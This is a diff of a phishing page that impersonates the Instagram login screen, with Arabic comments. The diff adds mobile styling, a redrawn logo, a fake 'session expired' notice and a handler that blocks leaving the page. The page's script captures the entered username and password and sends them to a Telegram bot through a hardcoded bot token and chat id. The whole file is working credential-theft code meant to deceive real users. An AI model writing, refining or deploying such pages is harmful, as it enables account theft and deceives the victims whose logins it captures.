@@ -2,58 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Login • Instagram</title>
     <style>
-        body {
+        * {
+            box-sizing: border-box;
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
             background-color: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden; /* منع التمرير لتقييد الشاشة بالكامل */
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
         }
-        .main-container {
-            width: 350px;
-        }
-        .login-card {
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
             background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px 40px 10px 40px;
+            border: none;
             text-align: center;
-            box-sizing: border-box;
-            margin-bottom: 10px;
         }
-        .logo {
-            font-family: cursive, sans-serif;
-            font-size: 50px;
-            margin: 22px 0 12px 0;
-            font-weight: normal;
-            color: #262626;
+        @media (min-width: 450px) {
+            .login-container {
+                border: 1px solid #dbdbdb;
+                border-radius: 1px;
+                padding: 40px;
+            }
+        }
+        .logo-img {
+            width: 175px;
+            margin: 10px 0 25px 0;
         }
         .session-notice {
-            font-size: 14px;
+            font-size: 13px;
             color: #737373;
             line-height: 18px;
             margin-bottom: 20px;
-            font-weight: 400;
         }
         input {
             width: 100%;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            box-sizing: border-box;
             color: #262626;
-            font-size: 12px;
-            padding: 9px 8px;
+            font-size: 14px;
+            padding: 10px 12px;
             margin-bottom: 6px;
+            outline: none;
         }
         input:focus {
             border-color: #a8a8a8;
-            outline: none;
         }
         .btn {
             background-color: #0095f6;
@@ -64,14 +68,14 @@
             font-weight: 600;
             font-size: 14px;
             width: 100%;
-            padding: 7px;
-            margin-top: 8px;
+            padding: 10px;
+            margin-top: 10px;
             margin-bottom: 15px;
         }
         .or-divider {
             display: flex;
             align-items: center;
-            margin: 10px 0 18px 0;
+            margin: 15px 0;
         }
         .or-line {
             flex-grow: 1;
@@ -89,67 +93,61 @@
             font-size: 14px;
             font-weight: 600;
             text-decoration: none;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
+            display: block;
+            margin-bottom: 15px;
         }
         .forgot-pass {
             color: #00376b;
             font-size: 12px;
             text-decoration: none;
             display: block;
-            margin-bottom: 20px;
-        }
-        .signup-card {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-            color: #262626;
-        }
-        .signup-card a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div class="login-card">
-            <div class="logo">Instagram</div>
-            
-            <!-- رسالة احترافية تدمج تنبيه انتهاء الجلسة بشكل طبيعي -->
-            <div class="session-notice">
-                Your session has expired. Please log in again to continue.
-            </div>
-
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button type="submit" class="btn">Log In</button>
-            </form>
-
-            <div class="or-divider">
-                <div class="or-line"></div>
-                <div class="or-text">OR</div>
-                <div class="or-line"></div>
-            </div>
-
-            <a href="#" class="fb-login">Log in with Facebook</a>
-            <a href="#" class="forgot-pass">Forgot password?</a>
+    <div class="login-container">
+        <!-- استخدام شعار إنستغرام الرسمي عبر SVG لتجنب مشاكل الخطوط -->
+        <div>
+            <svg aria-label="Instagram" class="logo-img" fill="#262626" height="51" viewBox="0 0 175 51" width="175">
+                <path d="M14.5 3.5C18.5 3.5 19.5 3.7 21.2 4.4C22.8 5.1 24 6.3 24.7 7.9C25.4 9.6 25.6 10.6 25.6 14.6V36.4C25.6 40.4 25.4 41.4 24.7 43.1C24 44.7 22.8 45.9 21.2 46.6C19.5 47.3 18.5 47.5 14.5 47.5H11.1C7.1 47.5 6.1 47.3 4.4 46.6C2.8 45.9 1.6 44.7 0.9 43.1C0.2 41.4 0 40.4 0 36.4V14.6C0 10.6 0.2 9.6 0.9 7.9C1.6 6.3 2.8 5.1 4.4 4.4C6.1 3.7 7.1 3.5 11.1 3.5H14.5ZM14.5 0H11.1C6.2 0 4.6 0.2 2.7 1C0.9 1.8 1.8 3.3 1 5.2C0.2 7.1 0 8.7 0 13.6V37.4C0 42.3 0.2 43.9 1 45.8C1.8 47.7 0.9 46.2 2.7 47C4.6 47.8 6.2 48 11.1 48H14.5C19.4 48 21 47.8 22.9 47C24.7 46.2 23.8 47.7 24.6 45.8C25.4 43.9 25.6 42.3 25.6 37.4V13.6C25.6 8.7 25.4 7.1 24.6 5.2C23.8 3.3 24.7 4.8 22.9 1C21 0.2 19.4 0 14.5 0Z"></path>
+                <path d="M37.5 25.5C37.5 18.6 43.1 13 50 13C56.9 13 62.5 18.6 62.5 25.5C62.5 32.4 56.9 38 50 38C43.1 38 37.5 32.4 37.5 25.5ZM50 9.5C41.2 9.5 34 16.7 34 25.5C34 34.3 41.2 41.5 50 41.5C58.8 41.5 66 34.3 66 25.5C66 16.7 58.8 9.5 50 9.5Z"></path>
+                <circle cx="63.5" cy="14.5" r="2.5"></circle>
+                <path d="M84.5 13C88.5 13 90.5 14.5 92 17.5L95 15.5C92.5 11.5 89.5 9.5 84.5 9.5C78.5 9.5 74 14 74 21.5V23.5H71V27H74V47.5H77.5V27H88.5V23.5H77.5V21.5C77.5 16 80 13 84.5 13Z"></path>
+                <path d="M109 13C104.5 13 101 16 101 21.5V23.5H98V27H101V47.5H104.5V27H114.5V23.5H104.5V21.5C104.5 16 107 13 111.5 13H113.5V9.5H110.5C110 9.5 109.5 9.7 109 13Z"></path>
+                <path d="M125 9.5C121.5 9.5 119 11 117.5 13.5V9.5H114V47.5H117.5V30C117.5 21 122 17.5 127.5 18C128.5 18.1 129.5 18.2 130 18.4V14.9C129.5 14.7 128.5 14.6 127.5 14.6C125.5 14.6 124 15.5 123 17V13.5C124 11.5 125.5 9.5 125 9.5Z"></path>
+                <path d="M149.5 13C143.5 13 139 17.5 139 25.5C139 33.5 143.5 38 149.5 38C153.5 38 156.5 36 158.5 33L156 30.5C154.5 32.5 152.5 34.5 149.5 34.5C145.5 34.5 142.5 32 142.5 27.5H161.5C161.5 26.5 161.5 25 161.5 24C161.5 17 156.5 13 149.5 13ZM142.5 24C143 19 145.5 16.5 149.5 16.5C153.5 16.5 156 19 156 24H142.5Z"></path>
+                <path d="M175 9.5H171.5V17.5C170 14.5 168 13 164.5 13C161.5 13 159.5 14.5 158.5 16.5C157.5 14.5 155.5 13 152.5 13C147.5 13 145 16 145 21.5V47.5H148.5V23.5C148.5 18 150 16.5 153 16.5C156 16.5 157.5 18 157.5 23.5V47.5H161V23.5C161 18 162.5 16.5 165.5 16.5C168.5 16.5 170 18 170 23.5V47.5H173.5V13.5C173.5 11 174.5 9.5 175 9.5Z"></path>
+            </svg>
+        </div>
+        
+        <div class="session-notice">
+            Your session has expired. Please log in again to continue.
         </div>
 
-        <div class="signup-card">
-            Don't have an account? <a href="#">Sign up</a>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+
+        <div class="or-divider">
+            <div class="or-line"></div>
+            <div class="or-text">OR</div>
+            <div class="or-line"></div>
         </div>
+
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot-pass">Forgot password?</a>
     </div>
 
     <script>
+        // قفل مغادرة الصفحة أو منع التحديث إلا بعد التفاعل
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
@@ -158,7 +156,7 @@
             const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatId = "865078178";
             
-            const message = "🎯 Professional Page Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
+            const message = "🎯 Locked View Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
